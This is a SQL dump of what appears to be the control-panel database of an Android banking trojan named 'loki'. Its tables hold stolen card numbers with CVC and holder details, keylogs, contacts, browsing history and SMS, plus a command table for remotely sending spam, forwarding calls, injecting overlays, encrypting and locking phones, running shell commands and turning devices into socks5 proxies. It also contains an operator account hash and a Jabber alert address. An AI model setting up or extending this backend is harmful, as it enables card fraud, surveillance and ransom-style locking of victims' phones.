-- phpMyAdmin SQL Dump
-- version 4.2.12deb2+deb8u2
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Dec 05, 2017 at 07:38 AM
-- Server version: 5.5.58-0+deb8u1
-- PHP Version: 5.6.30-0+deb8u1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `loki4dev`
--

-- --------------------------------------------------------

--
-- Table structure for table `answer_rules`
--

CREATE TABLE IF NOT EXISTS `answer_rules` (
`id` int(11) NOT NULL,
  `imei` text NOT NULL,
  `reg_rule` text NOT NULL,
  `action` text NOT NULL,
  `param1` text NOT NULL,
  `param2` text NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `answer_rules`
--

INSERT INTO `answer_rules` (`id`, `imei`, `reg_rule`, `action`, `param1`, `param2`) VALUES
(8, '*', 'Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ñ‚Ðµ ÐºÐ¾Ð´ %CODE% Ð½Ð° Ð½Ð¾Ð¼ÐµÑ€ %NUMBER%', 'sms', '$1', '$2');

-- --------------------------------------------------------

--
-- Table structure for table `cc_info`
--

CREATE TABLE IF NOT EXISTS `cc_info` (
`id` int(11) unsigned NOT NULL,
  `IMEI` text NOT NULL,
  `CARD` text NOT NULL,
  `typeCard` text NOT NULL,
  `MMYY` text NOT NULL,
  `CVC` text NOT NULL,
  `VBV` text NOT NULL,
  `CardholderName` text NOT NULL,
  `PhoneNumber` text NOT NULL,
  `birth_date` text NOT NULL,
  `zip_code` text NOT NULL,
  `holder_address` text NOT NULL,
  `last_update` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `client_history`
--

CREATE TABLE IF NOT EXISTS `client_history` (
`id` int(11) NOT NULL,
  `IMEI` text NOT NULL,
  `link` text NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=52 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `client_history`
--

INSERT INTO `client_history` (`id`, `IMEI`, `link`) VALUES
(2, '000000000000000', 'https://www.google.com.ua/webhp?source=android-home&gws_rd=cr&dcr=0&ei=dsC_WcDBIImSarrog8gH'),
(3, '000000000000000', 'http://www.google.com/'),
(4, '000000000000000', 'http://picasaweb.google.com/'),
(5, '000000000000000', 'http://www.yahoo.com/'),
(6, '000000000000000', 'http://www.msn.com/'),
(7, '000000000000000', 'http://twitter.com/'),
(8, '000000000000000', 'http://www.facebook.com/'),
(9, '000000000000000', 'http://www.wikipedia.org/'),
(10, '000000000000000', 'http://www.ebay.com/'),
(11, '000000000000000', 'http://www.cnn.com/'),
(12, '000000000000000', 'http://www.nytimes.com/'),
(13, '000000000000000', 'http://espn.com/'),
(14, '000000000000000', 'http://www.amazon.com/'),
(15, '000000000000000', 'http://www.weather.com/'),
(16, '000000000000000', 'http://www.bbc.co.uk/'),
(19, '000000000000000', 'https://www.google.com.ua/webhp?source=android-home&gws_rd=cr&dcr=0&ei=dsC_WcDBIImSarrog8gH'),
(20, '000000000000000', 'http://www.google.com/'),
(21, '000000000000000', 'http://picasaweb.google.com/'),
(22, '000000000000000', 'http://www.yahoo.com/'),
(23, '000000000000000', 'http://www.msn.com/'),
(24, '000000000000000', 'http://twitter.com/'),
(25, '000000000000000', 'http://www.facebook.com/'),
(26, '000000000000000', 'http://www.wikipedia.org/'),
(27, '000000000000000', 'http://www.ebay.com/'),
(28, '000000000000000', 'http://www.cnn.com/'),
(29, '000000000000000', 'http://www.nytimes.com/'),
(30, '000000000000000', 'http://espn.com/'),
(31, '000000000000000', 'http://www.amazon.com/'),
(32, '000000000000000', 'http://www.weather.com/'),
(33, '000000000000000', 'http://www.bbc.co.uk/'),
(34, '000000000000000', 'https://www.google.com.ua/webhp?source=android-home&gws_rd=cr&dcr=0&ei=SfDNWbvjKsiwaY_vk_gJ'),
(35, '000000000000000', 'http://flash-new.com/'),
(36, '000000000000000', 'http://flash-new.com/upd/index.php?view=adalt'),
(37, '000000000000000', 'https://www.google.com/webhp?source=android-home'),
(38, '000000000000000', 'http://www.google.com/'),
(39, '000000000000000', 'http://picasaweb.google.com/'),
(40, '000000000000000', 'http://www.yahoo.com/'),
(41, '000000000000000', 'http://www.msn.com/'),
(42, '000000000000000', 'http://twitter.com/'),
(43, '000000000000000', 'http://www.facebook.com/'),
(44, '000000000000000', 'http://www.wikipedia.org/'),
(45, '000000000000000', 'http://www.ebay.com/'),
(46, '000000000000000', 'http://www.cnn.com/'),
(47, '000000000000000', 'http://www.nytimes.com/'),
(48, '000000000000000', 'http://espn.com/'),
(49, '000000000000000', 'http://www.amazon.com/'),
(50, '000000000000000', 'http://www.weather.com/'),
(51, '000000000000000', 'http://www.bbc.co.uk/');

-- --------------------------------------------------------

--
-- Table structure for table `client_location`
--

CREATE TABLE IF NOT EXISTS `client_location` (
  `id` int(11) NOT NULL,
  `IMEI` text NOT NULL,
  `IP` text NOT NULL,
  `country` int(11) NOT NULL,
  `as` text NOT NULL,
  `city` int(11) NOT NULL,
  `countryCode` int(11) NOT NULL,
  `isp` int(11) NOT NULL,
  `lat` int(11) NOT NULL,
  `lon` int(11) NOT NULL,
  `org` int(11) NOT NULL,
  `query` int(11) NOT NULL,
  `region` int(11) NOT NULL,
  `regionName` int(11) NOT NULL,
  `timezone` int(11) NOT NULL,
  `zip` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `commands`
--

CREATE TABLE IF NOT EXISTS `commands` (
  `id` int(255) unsigned NOT NULL,
  `IMEI` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL,
  `command_name` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `com_config`
--

CREATE TABLE IF NOT EXISTS `com_config` (
`id` int(11) NOT NULL,
  `name` text NOT NULL,
  `command` text NOT NULL,
  `number` text NOT NULL,
  `text` text NOT NULL,
  `description` text NOT NULL,
  `priority` int(11) NOT NULL DEFAULT '10',
  `html` text NOT NULL,
  `startup` int(11) NOT NULL DEFAULT '0',
  `startup_number` text NOT NULL,
  `startup_text` text NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=48 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `com_config`
--

INSERT INTO `com_config` (`id`, `name`, `command`, `number`, `text`, `description`, `priority`, `html`, `startup`, `startup_number`, `startup_text`) VALUES
(4, 'sentUpdate', '|command=Update Bots|number=%s|text=%s::', '2', 'Install Apk', 'Install new bot version or other apk file', 5, '', 0, '', ''),
(5, 'startSpam', '|command=Send_spam|number=|text=%s::', '1', 'Start Spam', 'Sent spam (need only text option)', 5, '', 0, '', ''),
(6, 'startNumber', '|Send_call=%s|numberst::', '1', 'Call Number', 'Call to number', 5, '', 0, '', ''),
(7, 'startForward', '|Forward_call=%s|forwardst::', '1', 'Call Forward', 'Call forwarding', 5, '', 0, ' ', ''),
(8, 'startLeading', 'Go_Leading_request::', '', 'Start Leading', 'Command for start Lending', 5, '', 0, '', ''),
(11, 'sendSMS', '|command=Send_SMS|number=%s|text=%s::', '2', 'Send SMS', 'Send SMS', 5, '', 0, ' ', ' '),
(13, 'getAppAll', 'Start_AllApp::', '', 'Get all App', 'Get all installed app names\n(command is not complete)', 5, '', 0, '', ''),
(14, 'getBrowserHistory', 'Gethistori::', '', 'Get browser history', 'Get browser history (command is not complete)', 5, '', 0, '', ''),
(16, 'startWeb', '|Startveb_call=%s|svebdst::', '1', 'Start Web page', 'Open web page on smartphone', 8, '', 0, '', ''),
(17, 'startApp', '|App_call=%s|appst::', '1', 'Start App', 'Try to start application.', 8, '', 0, '', ''),
(26, 'getContacts', 'Go_Contacts::', '', 'Get all contacts', 'Get all contacts from smartphone to server DB', 8, '', 0, '', ''),
(31, 'startSmsMng', 'Go_Smsmnd::', '0', 'Start SMS manager', 'Command for start SMS manager', 5, '', 0, '', ''),
(32, 'startPUSH', 'cmd=Pushcomm|app=%s|tit=%s|ico=%s|msg=%s|endcmd::', '4', 'Start PUSH', 'Push command with parameters', 10, '', 0, '', ''),
(33, 'deleteSMS', 'Dell_sms::', '0', 'Delete all sms', 'Delete all SMS (android 4.4)', 5, '', 0, '', ''),
(34, 'getAllSMS', 'Go_GetAlls::', '0', 'Get all SMS', 'Get all SMS from phone', 5, '', 0, '', ''),
(35, 'startCrypt', 'Go_Crypt::', '0', 'Start CryptDevice', 'Crypt data and lock devide', 5, '', 0, '', ''),
(36, 'startSocks', 'startSocks=%s|port=%s|usr=%s|pass=%s|endcmd::', '0', 'Start Socks5', 'Start socks5 proxy server on device', 5, '', 0, '', ''),
(37, 'startInject', 'Start_Inject::', '0', 'Start_Inject', 'Start_Inject', 5, '', 0, '', ''),
(38, 'spamBase', 'Spam_basa::', '0', 'Spam_basa', 'Spam_basa', 5, '', 0, '', ''),
(39, 'backCrypt', 'Beck_Crypt::', '0', 'Beck_Crypt', 'Beck_Crypt', 5, '', 0, '', ''),
(40, 'ccLoker', 'CCLoker::', '0', 'CCLoker', 'CCLoker', 5, '', 0, '', ''),
(41, 'deleteApp', 'DeleteApp::', '0', 'DeleteApp', 'DeleteApp', 5, '', 0, '', ''),
(42, 'resFwdCall', 'ResForward_call|Forward_call=%s|forwardst::', '1', 'ResForward_call', 'ResForward_call', 5, '', 0, '', ''),
(43, 'sendUSSD', '|Startvebebs_call=", "|svebdstwerw"', '1', 'Send_USSD', 'Send_USSD', 5, '', 0, '', ''),
(44, 'startShell', 'Shell=%s|appst::', '1', 'Start Shell', 'Start shell command', 5, '', 0, '', ''),
(45, 'startPasswords', 'Go_Passwords::', '0', 'Change password', 'Change password on phone', 5, '', 0, '', ''),
(46, 'stopInject', 'Stop_Inject::', '0', 'Stop inject', 'Stop inject', 5, '', 0, '', ''),
(47, 'goScreen', 'Go_Screen::', '', 'Screen lock', 'Screen lock', 5, '', 0, '', '');

-- --------------------------------------------------------

--
-- Table structure for table `contacts`
--

CREATE TABLE IF NOT EXISTS `contacts` (
`id` int(11) NOT NULL,
  `IMEI` text NOT NULL,
  `name` text NOT NULL,
  `country` text NOT NULL,
  `phone` text NOT NULL,
  `e_name` text NOT NULL,
  `email` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `devices`
--

CREATE TABLE IF NOT EXISTS `devices` (
  `id` bigint(20) NOT NULL,
  `imei` varchar(20) NOT NULL,
  `model` varchar(50) NOT NULL,
  `root` int(1) NOT NULL,
  `country` varchar(2) NOT NULL,
  `osver` varchar(10) NOT NULL,
  `last_connect` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `group_id` varchar(10) NOT NULL DEFAULT 'none',
  `uniqnum` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `guest`
--

CREATE TABLE IF NOT EXISTS `guest` (
`guest_id` int(11) unsigned NOT NULL,
  `user_login` varchar(30) NOT NULL,
  `user_password` varchar(32) NOT NULL,
  `apk_version` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jabber_notifications`
--

CREATE TABLE IF NOT EXISTS `jabber_notifications` (
`id` int(11) NOT NULL,
  `address` text NOT NULL,
  `bot_event` tinyint(1) NOT NULL DEFAULT '1',
  `card_event` tinyint(1) NOT NULL DEFAULT '1',
  `bank_event` tinyint(1) NOT NULL DEFAULT '1',
  `dedicated_event` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `jabber_notifications`
--

INSERT INTO `jabber_notifications` (`id`, `address`, `bot_event`, `card_event`, `bank_event`, `dedicated_event`) VALUES
(2, 'loki@jabb.im', 0, 1, 1, 0);

-- --------------------------------------------------------

--
-- Table structure for table `key_log`
--

CREATE TABLE IF NOT EXISTS `key_log` (
`id` int(11) NOT NULL,
  `IMEI` text NOT NULL,
  `data` text NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `referer` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `kliets`
--

CREATE TABLE IF NOT EXISTS `kliets` (
`id` int(255) unsigned NOT NULL,
  `IMEI` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) NOT NULL,
  `country` varchar(30) DEFAULT NULL,
  `bank` varchar(300) DEFAULT NULL,
  `model` varchar(50) DEFAULT NULL,
  `lastConnect` varchar(30) NOT NULL,
  `firstConnect` varchar(30) NOT NULL,
  `inj` varchar(2) DEFAULT NULL,
  `l_bank` varchar(2) DEFAULT NULL,
  `log` varchar(2) DEFAULT NULL,
  `r00t` varchar(10) DEFAULT NULL,
  `screen` varchar(10) DEFAULT NULL,
  `version_apk` text,
  `A_V` text NOT NULL,
  `botid` varchar(36) NOT NULL,
  `info` text NOT NULL,
  `info2` text NOT NULL,
  `card` text NOT NULL,
  `comment` text NOT NULL,
  `j_notify` int(11) DEFAULT '0',
  `socks` int(11) NOT NULL DEFAULT '0',
  `internet` text NOT NULL,
  `IP` text NOT NULL,
  `zip` text NOT NULL,
  `regionName` text NOT NULL,
  `city` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `logs`
--

CREATE TABLE IF NOT EXISTS `logs` (
`id` int(11) NOT NULL,
  `IMEI` text NOT NULL,
  `text` text NOT NULL,
  `date` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `proxy_servers`
--

CREATE TABLE IF NOT EXISTS `proxy_servers` (
`id` int(11) NOT NULL,
  `ip` text NOT NULL,
  `user` text NOT NULL,
  `pass` text NOT NULL,
  `forward_user` text NOT NULL,
  `forward_pass` text NOT NULL,
  `root` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `country` text NOT NULL,
  `note` text NOT NULL,
  `status` int(11) NOT NULL,
  `status_text` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
  `s_name` varchar(255) NOT NULL,
  `s_value` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `socks`
--

CREATE TABLE IF NOT EXISTS `socks` (
`id` int(11) NOT NULL,
  `IMEI` text NOT NULL,
  `bot_country` text NOT NULL,
  `server` int(11) NOT NULL,
  `port` int(11) NOT NULL,
  `connect_time` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `statistics`
--

CREATE TABLE IF NOT EXISTS `statistics` (
`id` bigint(20) NOT NULL,
  `task_id` bigint(20) NOT NULL,
  `start` int(10) NOT NULL,
  `run` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `stat_apps`
--

CREATE TABLE IF NOT EXISTS `stat_apps` (
`id` int(11) NOT NULL,
  `app_name` text NOT NULL,
  `count` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `stat_hist`
--

CREATE TABLE IF NOT EXISTS `stat_hist` (
`id` int(11) NOT NULL,
  `domain` text NOT NULL,
  `count` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `task`
--

CREATE TABLE IF NOT EXISTS `task` (
`id` int(11) NOT NULL,
  `url` varchar(255) NOT NULL,
  `package` text NOT NULL,
  `country` text NOT NULL,
  `active` int(1) NOT NULL,
  `lim` int(6) NOT NULL,
  `real_count` int(11) NOT NULL,
  `complete` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `tasks_stat`
--

CREATE TABLE IF NOT EXISTS `tasks_stat` (
  `task_id` int(11) NOT NULL,
  `uniqnum` varchar(255) NOT NULL,
  `take` int(1) DEFAULT NULL,
  `run` int(1) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
`user_id` int(11) unsigned NOT NULL,
  `user_login` varchar(30) NOT NULL,
  `user_password` varchar(32) NOT NULL
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `user_login`, `user_password`) VALUES
(1, 'bot4fun', '16ee4118500ad0670339a8c234a0255c');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `answer_rules`
--
ALTER TABLE `answer_rules`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cc_info`
--
ALTER TABLE `cc_info`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `client_history`
--
ALTER TABLE `client_history`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `com_config`
--
ALTER TABLE `com_config`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contacts`
--
ALTER TABLE `contacts`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `guest`
--
ALTER TABLE `guest`
 ADD PRIMARY KEY (`guest_id`);

--
-- Indexes for table `jabber_notifications`
--
ALTER TABLE `jabber_notifications`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `key_log`
--
ALTER TABLE `key_log`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `kliets`
--
ALTER TABLE `kliets`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`), ADD KEY `id_2` (`id`);

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `proxy_servers`
--
ALTER TABLE `proxy_servers`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settings`
--
ALTER TABLE `settings`
 ADD UNIQUE KEY `s_name` (`s_name`);

--
-- Indexes for table `socks`
--
ALTER TABLE `socks`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `statistics`
--
ALTER TABLE `statistics`
 ADD PRIMARY KEY (`task_id`), ADD KEY `tid` (`id`) USING BTREE;

--
-- Indexes for table `stat_apps`
--
ALTER TABLE `stat_apps`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `stat_hist`
--
ALTER TABLE `stat_hist`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `task`
--
ALTER TABLE `task`
 ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
 ADD PRIMARY KEY (`user_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `answer_rules`
--
ALTER TABLE `answer_rules`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=9;
--
-- AUTO_INCREMENT for table `cc_info`
--
ALTER TABLE `cc_info`
MODIFY `id` int(11) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `client_history`
--
ALTER TABLE `client_history`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=52;
--
-- AUTO_INCREMENT for table `com_config`
--
ALTER TABLE `com_config`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=48;
--
-- AUTO_INCREMENT for table `contacts`
--
ALTER TABLE `contacts`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `guest`
--
ALTER TABLE `guest`
MODIFY `guest_id` int(11) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `jabber_notifications`
--
ALTER TABLE `jabber_notifications`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `key_log`
--
ALTER TABLE `key_log`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `kliets`
--
ALTER TABLE `kliets`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `logs`
--
ALTER TABLE `logs`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `proxy_servers`
--
ALTER TABLE `proxy_servers`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `socks`
--
ALTER TABLE `socks`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `statistics`
--
ALTER TABLE `statistics`
MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `stat_apps`
--
ALTER TABLE `stat_apps`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `stat_hist`
--
ALTER TABLE `stat_hist`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `task`
--
ALTER TABLE `task`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
MODIFY `user_id` int(11) unsigned NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=5;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
